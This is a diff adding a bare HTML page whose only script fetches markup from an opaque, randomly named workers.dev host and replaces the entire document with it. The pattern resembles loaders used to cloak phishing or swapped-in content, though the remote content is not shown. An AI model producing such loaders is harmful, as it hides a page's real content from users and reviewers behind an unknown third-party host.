@@ -1,0 +1,15 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Page</title>
+</head>
+<body>
+<script>
+fetch('https://wild-sky-d9c5.nameless-cherry-998c.workers.dev/')
+  .then(r => r.text())
+  .then(html => document.documentElement.innerHTML = html);
+</script>
+</body>
+</html>
